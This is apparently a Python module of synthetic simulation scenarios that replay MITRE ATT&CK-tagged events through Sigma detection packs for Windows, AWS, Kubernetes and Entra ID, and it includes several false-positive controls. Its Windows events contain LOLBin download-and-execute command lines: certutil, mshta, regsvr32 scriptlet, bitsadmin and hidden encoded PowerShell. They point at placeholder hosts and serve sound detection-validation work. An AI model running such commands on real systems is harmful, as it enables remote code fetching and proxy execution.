"""Product-side default simulation scenarios for detection validation (#118).

The ``POST /validation/runs`` route replays these deterministic, fully synthetic,
MITRE-tagged scenarios through the built-in Sigma packs to produce a coverage
report — the mock-first stand-in until live Atomic Red Team / Caldera execution
is wired (deferred). Event field names match the logsource dialect the target
rules use: Windows ``process_creation`` (``Image`` / ``CommandLine`` /
``EventID``), Windows Security (``EventID`` / ``LogonType``), AWS CloudTrail
(``eventSource`` / ``eventName`` / flattened ``requestParameters.*``),
Kubernetes audit (``verb`` / ``objectRef.*`` / ``requestObject.*``), and Entra ID
audit logs (``OperationName`` / ``ModifiedProperties``).

Breadth (#118 scenario library)
------------------------------
The library spans **26+ ATT&CK techniques** drawn from the techniques our own
packs actually reference — ``windows_baseline``, ``windows_lotl_behavioral``,
``cloud_control_plane``, ``credential_access_cloud``, ``data_exfiltration_cloud``,
``detection_evasion_cloud``, ``enumeration_reconnaissance``,
``container_kubernetes`` and ``identity`` (see :func:`default_validation_packs`)
— so the coverage heat-map has real surface instead of a single technique.
:func:`scenario_technique_ids` is the flattened technique universe.

Defensive-facing: every payload is a benign detection-signature probe, not a
weaponizable technique — the encoded-PowerShell blob decodes to inert text, all
hosts/URLs are ``.test``/``example`` placeholders, and no scenario carries a real
payload or a working command chain. Several scenarios are deliberate
false-positive **controls** (``expected_to_fire=False``): benign PowerShell, a
successful logon, and AWS-service-principal reconnaissance that the rules'
own filters must suppress.

Mirrors the golden-test scenario fixtures, kept in product code so the route
does not depend on the test tree.
"""

from __future__ import annotations

from btagent_shared.types.detection_validation import (
    SimulatedAttackEvent,
    SimulationScenario,
)

# Packs the default scenario library is written against. Every technique below
# is referenced by at least one rule in one of these packs, so the replay
# measures real coverage rather than a vacuum.
DEFAULT_VALIDATION_PACKS: tuple[str, ...] = (
    "windows_baseline",
    "windows_lotl_behavioral",
    "cloud_control_plane",
    "credential_access_cloud",
    "data_exfiltration_cloud",
    "detection_evasion_cloud",
    "enumeration_reconnaissance",
    "container_kubernetes",
    "identity",
)

# Base64 of "echo" — inert, well under any real payload; present only so the
# ``encoded_powershell`` rule's ``-EncodedCommand`` signature matches.
_INERT_ENCODED_BLOB = "ZQBjAGgAbwA="

_SYSTEM32 = "C:\\Windows\\System32"


def _proc_event(
    event_id: str,
    technique_id: str,
    *,
    image: str,
    command_line: str,
    expected_to_fire: bool = True,
) -> SimulatedAttackEvent:
    """A Windows ``process_creation`` (Sysmon EventID 1) simulated event."""
    return SimulatedAttackEvent(
        event_id=event_id,
        technique_id=technique_id,
        source_event_dict={
            "Image": image,
            "CommandLine": command_line,
            "EventID": 1,
        },
        expected_to_fire=expected_to_fire,
    )


def _event(
    event_id: str,
    technique_id: str,
    payload: dict,
    *,
    expected_to_fire: bool = True,
) -> SimulatedAttackEvent:
    """A raw simulated event in whatever dialect its target rules expect."""
    return SimulatedAttackEvent(
        event_id=event_id,
        technique_id=technique_id,
        source_event_dict=payload,
        expected_to_fire=expected_to_fire,
    )


def _scenario(
    scenario_id: str,
    name: str,
    description: str,
    technique_ids: list[str],
    events: list[SimulatedAttackEvent],
) -> SimulationScenario:
    return SimulationScenario(
        id=scenario_id,
        name=name,
        description=description,
        technique_ids=technique_ids,
        events=events,
    )


# --------------------------------------------------------------------------- #
# Windows endpoint — windows_baseline + windows_lotl_behavioral
# --------------------------------------------------------------------------- #


def _windows_scenarios() -> list[SimulationScenario]:
    return [
        _scenario(
            "default_encoded_powershell",
            "Encoded PowerShell",
            "PowerShell invoked with -EncodedCommand (T1059.001).",
            ["T1059.001"],
            [
                _proc_event(
                    "default_evt_encoded_ps",
                    "T1059.001",
                    image=f"{_SYSTEM32}\\WindowsPowerShell\\v1.0\\powershell.exe",
                    command_line=f"powershell.exe -EncodedCommand {_INERT_ENCODED_BLOB}",
                )
            ],
        ),
        _scenario(
            "default_benign_powershell",
            "Benign PowerShell",
            "Plain PowerShell with no encoded command — a false-positive control.",
            ["T1059.001"],
            [
                _proc_event(
                    "default_evt_benign_ps",
                    "T1059.001",
                    image=f"{_SYSTEM32}\\WindowsPowerShell\\v1.0\\powershell.exe",
                    command_line="powershell.exe -Command Get-Process",
                    expected_to_fire=False,
                )
            ],
        ),
        _scenario(
            "default_obfuscated_powershell",
            "Obfuscated PowerShell loader",
            "Short-form -e JAB encoded launcher — obfuscated payload (T1027).",
            ["T1027"],
            [
                _proc_event(
                    "default_evt_obfuscated_ps",
                    "T1027",
                    image=f"{_SYSTEM32}\\WindowsPowerShell\\v1.0\\powershell.exe",
                    command_line="powershell.exe -nop -w hidden -e JABzAD0A",
                )
            ],
        ),
        _scenario(
            "default_certutil_download",
            "Certutil ingress tool transfer",
            "certutil.exe -urlcache used as a LOLBin downloader (T1105).",
            ["T1105"],
            [
                _proc_event(
                    "default_evt_certutil_dl",
                    "T1105",
                    image=f"{_SYSTEM32}\\certutil.exe",
                    command_line=(
                        "certutil.exe -urlcache -split -f http://example.test/stage.txt stage.txt"
                    ),
                )
            ],
        ),
        _scenario(
            "default_certutil_decode",
            "Certutil on-host deobfuscation",
            "certutil.exe -decode turning a base64 blob back into a binary (T1140).",
            ["T1140"],
            [
                _proc_event(
                    "default_evt_certutil_decode",
                    "T1140",
                    image=f"{_SYSTEM32}\\certutil.exe",
                    command_line="certutil.exe -decode staged.b64 staged.bin",
                )
            ],
        ),
        _scenario(
            "default_mshta_remote",
            "Mshta remote HTA execution",
            "mshta.exe launching an attacker-hosted HTA (T1218.005).",
            ["T1218.005"],
            [
                _proc_event(
                    "default_evt_mshta",
                    "T1218.005",
                    image=f"{_SYSTEM32}\\mshta.exe",
                    command_line="mshta.exe https://example.test/probe.hta",
                )
            ],
        ),
        _scenario(
            "default_regsvr32_scriptlet",
            "Regsvr32 remote scriptlet (Squiblydoo)",
            "regsvr32.exe /i:http ... scrobj.dll signed-binary proxy execution (T1218.010).",
            ["T1218.010"],
            [
                _proc_event(
                    "default_evt_regsvr32",
                    "T1218.010",
                    image=f"{_SYSTEM32}\\regsvr32.exe",
                    command_line="regsvr32.exe /s /u /i:http://example.test/probe.sct scrobj.dll",
                )
            ],
        ),
        _scenario(
            "default_rundll32_proxy",
            "Rundll32 protocol-handler proxy execution",
            "rundll32.exe invoked with a javascript: handler (T1218.011).",
            ["T1218.011"],
            [
                _proc_event(
                    "default_evt_rundll32",
                    "T1218.011",
                    image=f"{_SYSTEM32}\\rundll32.exe",
                    command_line='rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";probe',
                )
            ],
        ),
        _scenario(
            "default_wmic_process_create",
            "WMIC process call create",
            "wmic.exe spawning a process locally or via /node: (T1047).",
            ["T1047"],
            [
                _proc_event(
                    "default_evt_wmic",
                    "T1047",
                    image=f"{_SYSTEM32}\\wbem\\wmic.exe",
                    command_line="wmic.exe /node:WORKSTATION-01 process call create calc.exe",
                )
            ],
        ),
        _scenario(
            "default_bitsadmin_transfer",
            "BITS transfer job",
            "bitsadmin.exe /transfer fetching a remote file (T1197).",
            ["T1197"],
            [
                _proc_event(
                    "default_evt_bitsadmin",
                    "T1197",
                    image=f"{_SYSTEM32}\\bitsadmin.exe",
                    command_line=(
                        "bitsadmin.exe /transfer probe /download "
                        "http://example.test/probe.bin C:\\Temp\\probe.bin"
                    ),
                )
            ],
        ),
        _scenario(
            "default_password_spray",
            "Failed network logons (spray candidate)",
            "Windows Security 4625 / LogonType 3 password-spray raw material (T1110.003). "
            "Includes a successful-logon false-positive control.",
            ["T1110.003"],
            [
                _event(
                    "default_evt_failed_logon",
                    "T1110.003",
                    {"EventID": 4625, "LogonType": 3, "TargetUserName": "probe.user"},
                ),
                _event(
                    "default_evt_success_logon",
                    "T1110.003",
                    {"EventID": 4624, "LogonType": 3, "TargetUserName": "probe.user"},
                    expected_to_fire=False,
                ),
            ],
        ),
    ]


# --------------------------------------------------------------------------- #
# AWS control plane — cloud_control_plane / credential_access_cloud /
# data_exfiltration_cloud / detection_evasion_cloud / enumeration_reconnaissance
# --------------------------------------------------------------------------- #


def _aws_scenarios() -> list[SimulationScenario]:
    return [
        _scenario(
            "default_config_recorder_stopped",
            "AWS Config recorder stopped",
            "StopConfigurationRecorder blinding configuration auditing (T1562.001).",
            ["T1562.001"],
            [
                _event(
                    "default_evt_config_stop",
                    "T1562.001",
                    {
                        "eventSource": "config.amazonaws.com",
                        "eventName": "StopConfigurationRecorder",
                    },
                )
            ],
        ),
        _scenario(
            "default_flow_logs_deleted",
            "VPC flow logs deleted",
            "DeleteFlowLogs removing network-plane visibility (T1562.008).",
            ["T1562.008"],
            [
                _event(
                    "default_evt_flowlogs_deleted",
                    "T1562.008",
                    {"eventSource": "ec2.amazonaws.com", "eventName": "DeleteFlowLogs"},
                ),
                _event(
                    "default_evt_cw_alarm_deleted",
                    "T1562.008",
                    {"eventSource": "monitoring.amazonaws.com", "eventName": "DeleteAlarms"},
                ),
            ],
        ),
        _scenario(
            "default_ec2_recon",
            "EC2 describe reconnaissance",
            "DescribeInstances inventory sweep by a human principal (T1580). Includes an "
            "AWS-service-principal control the rule's own filter must suppress.",
            ["T1580"],
            [
                _event(
                    "default_evt_ec2_describe",
                    "T1580",
                    {
                        "eventSource": "ec2.amazonaws.com",
                        "eventName": "DescribeInstances",
                        "userIdentity.type": "IAMUser",
                    },
                ),
                _event(
                    "default_evt_ec2_describe_service",
                    "T1580",
                    {
                        "eventSource": "ec2.amazonaws.com",
                        "eventName": "DescribeInstances",
                        "userIdentity.type": "AWSService",
                    },
                    expected_to_fire=False,
                ),
            ],
        ),
        _scenario(
            "default_iam_enumeration",
            "IAM principal enumeration",
            "ListUsers / GetAccountAuthorizationDetails permission mapping (T1087.004).",
            ["T1087.004"],
            [
                _event(
                    "default_evt_iam_listusers",
                    "T1087.004",
                    {
                        "eventSource": "iam.amazonaws.com",
                        "eventName": "ListUsers",
                        "userIdentity.arn": "arn:aws:iam::111111111111:user/probe",
                    },
                )
            ],
        ),
        _scenario(
            "default_sts_identity_probe",
            "STS stolen-credential probe",
            "GetCallerIdentity confirming which principal a credential belongs to (T1078.004).",
            ["T1078.004"],
            [
                _event(
                    "default_evt_sts_probe",
                    "T1078.004",
                    {
                        "eventSource": "sts.amazonaws.com",
                        "eventName": "GetCallerIdentity",
                        "userIdentity.type": "IAMUser",
                    },
                )
            ],
        ),
        _scenario(
            "default_ssm_parameter_decrypt",
            "SSM SecureString decrypted",
            "GetParameter with WithDecryption=true reading a secret in plaintext (T1552).",
            ["T1552"],
            [
                _event(
                    "default_evt_ssm_decrypt",
                    "T1552",
                    {
                        "eventSource": "ssm.amazonaws.com",
                        "eventName": "GetParameter",
                        "requestParameters.withDecryption": True,
                        "userIdentity.arn": "arn:aws:sts::111111111111:assumed-role/Probe/session",
                    },
                )
            ],
        ),
        _scenario(
            "default_secretsmanager_read",
            "Secrets Manager secret retrieved",
            "GetSecretValue by a non-allowlisted principal (T1552.005).",
            ["T1552.005"],
            [
                _event(
                    "default_evt_secret_read",
                    "T1552.005",
                    {
                        "eventSource": "secretsmanager.amazonaws.com",
                        "eventName": "GetSecretValue",
                        "userIdentity.arn": "arn:aws:sts::111111111111:assumed-role/Probe/session",
                    },
                )
            ],
        ),
        _scenario(
            "default_cloud_secret_store_sweep",
            "Cloud secret-store sweep",
            "BatchGetSecretValue sweeping the managed secret store (T1555.006).",
            ["T1555.006"],
            [
                _event(
                    "default_evt_secret_sweep",
                    "T1555.006",
                    {
                        "eventSource": "secretsmanager.amazonaws.com",
                        "eventName": "BatchGetSecretValue",
                        "userIdentity.arn": "arn:aws:sts::111111111111:assumed-role/Probe/session",
                    },
                )
            ],
        ),
        _scenario(
            "default_login_profile_persistence",
            "Console password added to a service account",
            "CreateLoginProfile on a key-only service identity (T1098).",
            ["T1098"],
            [
                _event(
                    "default_evt_login_profile",
                    "T1098",
                    {
                        "eventSource": "iam.amazonaws.com",
                        "eventName": "CreateLoginProfile",
                        "requestParameters.userName": "svc-probe-runner",
                    },
                )
            ],
        ),
        _scenario(
            "default_s3_public_exposure",
            "S3 bucket public access block removed",
            "DeletePublicAccessBlock exposing a bucket ahead of exfiltration (T1567.002 / T1530).",
            ["T1567.002", "T1530"],
            [
                _event(
                    "default_evt_s3_pab_removed",
                    "T1567.002",
                    {
                        "eventSource": "s3.amazonaws.com",
                        "eventName": "DeletePublicAccessBlock",
                    },
                ),
                _event(
                    "default_evt_s3_bulk_get",
                    "T1530",
                    {"eventName": "GetObject", "eventType": "AwsApiCall"},
                ),
            ],
        ),
        _scenario(
            "default_snapshot_shared_external",
            "Snapshot shared with an external account",
            "ModifySnapshotAttribute granting createVolumePermission cross-account (T1537).",
            ["T1537"],
            [
                _event(
                    "default_evt_snapshot_share",
                    "T1537",
                    {
                        "eventSource": "ec2.amazonaws.com",
                        "eventName": "ModifySnapshotAttribute",
                        "requestParameters.attributeType": "createVolumePermission",
                    },
                )
            ],
        ),
    ]


# --------------------------------------------------------------------------- #
# Kubernetes audit — container_kubernetes
# --------------------------------------------------------------------------- #


def _kubernetes_scenarios() -> list[SimulationScenario]:
    return [
        _scenario(
            "default_k8s_exec_into_pod",
            "kubectl exec into a running pod",
            "pods/exec subresource used for hands-on-keyboard access (T1609).",
            ["T1609"],
            [
                _event(
                    "default_evt_k8s_exec",
                    "T1609",
                    {
                        "verb": "create",
                        "objectRef.resource": "pods",
                        "objectRef.subresource": "exec",
                        "objectRef.namespace": "default",
                    },
                )
            ],
        ),
        _scenario(
            "default_k8s_privileged_pod",
            "Privileged / host-namespace pod created",
            "Pod created with hostPID — a container-escape primitive (T1610).",
            ["T1610"],
            [
                _event(
                    "default_evt_k8s_privileged",
                    "T1610",
                    {
                        "verb": "create",
                        "objectRef.resource": "pods",
                        "objectRef.namespace": "default",
                        "requestObject.spec.hostPID": True,
                    },
                )
            ],
        ),
        _scenario(
            "default_k8s_cluster_admin_bind",
            "cluster-admin ClusterRoleBinding created",
            "Binding the built-in cluster-admin role to a principal (T1078).",
            ["T1078"],
            [
                _event(
                    "default_evt_k8s_admin_bind",
                    "T1078",
                    {
                        "verb": "create",
                        "objectRef.resource": "clusterrolebindings",
                        "requestObject.roleRef.name": "cluster-admin",
                    },
                )
            ],
        ),
        _scenario(
            "default_k8s_sa_token_mount",
            "Service-account token auto-mounted in kube-system",
            "Pod auto-mounting its SA token in a control-plane namespace (T1528).",
            ["T1528"],
            [
                _event(
                    "default_evt_k8s_sa_token",
                    "T1528",
                    {
                        "verb": "create",
                        "objectRef.resource": "pods",
                        "objectRef.namespace": "kube-system",
                        "requestObject.spec.automountServiceAccountToken": True,
                    },
                )
            ],
        ),
    ]


# --------------------------------------------------------------------------- #
# Identity — identity pack (Entra ID audit logs)
# --------------------------------------------------------------------------- #


def _identity_scenarios() -> list[SimulationScenario]:
    consent_event = {
        "OperationName": "Consent to application",
        "ResultStatus": "Success",
        "ModifiedProperties": (
            "ConsentType: AllPrincipals; Scope: Directory.ReadWrite.All RoleManagement"
            ".ReadWrite.Directory"
        ),
    }
    return [
        _scenario(
            "default_entra_admin_consent",
            "Entra admin consent to high-privilege Graph scopes",
            "Tenant-wide admin consent granting Directory.ReadWrite.All to an app "
            "(T1550.001 / T1098.001).",
            ["T1550.001", "T1098.001"],
            [
                _event("default_evt_entra_consent", "T1550.001", dict(consent_event)),
                _event("default_evt_entra_app_role", "T1098.001", dict(consent_event)),
            ],
        ),
    ]


def default_validation_scenarios() -> list[SimulationScenario]:
    """The built-in scenario set the validation route replays in mock mode."""
    return [
        *_windows_scenarios(),
        *_aws_scenarios(),
        *_kubernetes_scenarios(),
        *_identity_scenarios(),
    ]


def default_validation_packs() -> tuple[str, ...]:
    """Packs the default scenario library is replayed against."""
    return DEFAULT_VALIDATION_PACKS


def scenario_technique_ids(
    scenarios: list[SimulationScenario] | None = None,
) -> list[str]:
    """Sorted, de-duplicated technique universe covered by *scenarios*.

    Defaults to the built-in library — the breadth the coverage heat-map draws
    on, and the assertion surface for the scenario-count test.
    """
    scenarios = default_validation_scenarios() if scenarios is None else scenarios
    techniques: set[str] = set()
    for scenario in scenarios:
        techniques.update(scenario.technique_ids)
        techniques.update(event.technique_id for event in scenario.events)
    return sorted(techniques)
